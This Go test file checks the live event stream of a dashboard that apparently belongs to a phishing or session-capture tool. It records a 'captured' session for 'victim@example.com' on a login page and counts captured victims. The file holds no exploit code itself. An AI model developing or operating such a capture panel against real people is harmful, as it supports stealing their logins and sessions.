package dashboard

import (
	"bufio"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/gorilla/mux"
)

type sseFrame struct {
	event string
	data  string
}

// readFrame reads one SSE frame (until a blank line) with a timeout, ignoring
// keepalive comment lines.
func readFrame(t *testing.T, br *bufio.Reader) sseFrame {
	t.Helper()
	type result struct {
		f   sseFrame
		err error
	}
	ch := make(chan result, 1)
	go func() {
		var f sseFrame
		var data []string
		for {
			line, err := br.ReadString('\n')
			if err != nil {
				ch <- result{err: err}
				return
			}
			line = strings.TrimRight(line, "\n")
			if line == "" {
				if f.event != "" || len(data) > 0 {
					f.data = strings.Join(data, "\n")
					ch <- result{f: f}
					return
				}
				continue // skip leading blank/keepalive separators
			}
			if strings.HasPrefix(line, ":") {
				continue
			}
			if strings.HasPrefix(line, "event:") {
				f.event = strings.TrimSpace(line[6:])
			} else if strings.HasPrefix(line, "data:") {
				data = append(data, strings.TrimPrefix(strings.TrimSpace(line[5:]), " "))
			}
		}
	}()
	select {
	case r := <-ch:
		if r.err != nil {
			t.Fatalf("read SSE frame: %v", r.err)
		}
		return r.f
	case <-time.After(5 * time.Second):
		t.Fatal("timed out waiting for SSE frame")
		return sseFrame{}
	}
}

func TestSSEStream(t *testing.T) {
	s, db := newTestServer(t)
	r := mux.NewRouter()
	s.routes(r)
	ts := httptest.NewServer(securityHeaders(r))
	defer ts.Close()

	// auth required
	if res, _ := doReq(t, ts, "GET", "/api/events", "", nil); res.StatusCode != 401 {
		t.Fatalf("expected 401 for unauthenticated stream, got %d", res.StatusCode)
	}

	admin := login(t, ts, "admin", "testpass123")

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	req, _ := http.NewRequestWithContext(ctx, "GET", ts.URL+"/api/events", nil)
	req.Header.Set("Authorization", "Bearer "+admin)
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("open stream: %v", err)
	}
	defer res.Body.Close()
	if res.StatusCode != 200 {
		t.Fatalf("stream status: %d", res.StatusCode)
	}
	if ct := res.Header.Get("Content-Type"); !strings.HasPrefix(ct, "text/event-stream") {
		t.Fatalf("unexpected content-type: %s", ct)
	}
	br := bufio.NewReader(res.Body)

	// initial snapshot (0 sessions)
	f := readFrame(t, br)
	if f.event != "sessions" {
		t.Fatalf("expected initial 'sessions' event, got %q", f.event)
	}
	var ev sessionsEvent
	if err := json.Unmarshal([]byte(f.data), &ev); err != nil {
		t.Fatalf("bad snapshot json: %v (%s)", err, f.data)
	}
	if ev.Total != 0 {
		t.Fatalf("expected 0 sessions initially, got %d", ev.Total)
	}

	// capture a session, then push a notification
	db.CreateSession("sid1", "example", "https://login.example.com/", "ua", "9.9.9.9")
	db.SetSessionUsername("sid1", "victim@example.com")
	s.notifySessions()

	f = readFrame(t, br)
	if f.event != "sessions" {
		t.Fatalf("expected pushed 'sessions' event, got %q", f.event)
	}
	if err := json.Unmarshal([]byte(f.data), &ev); err != nil {
		t.Fatalf("bad event json: %v", err)
	}
	if ev.Total != 1 || ev.Captured != 1 || ev.LatestId != 1 {
		t.Fatalf("unexpected event payload: %+v", ev)
	}
}
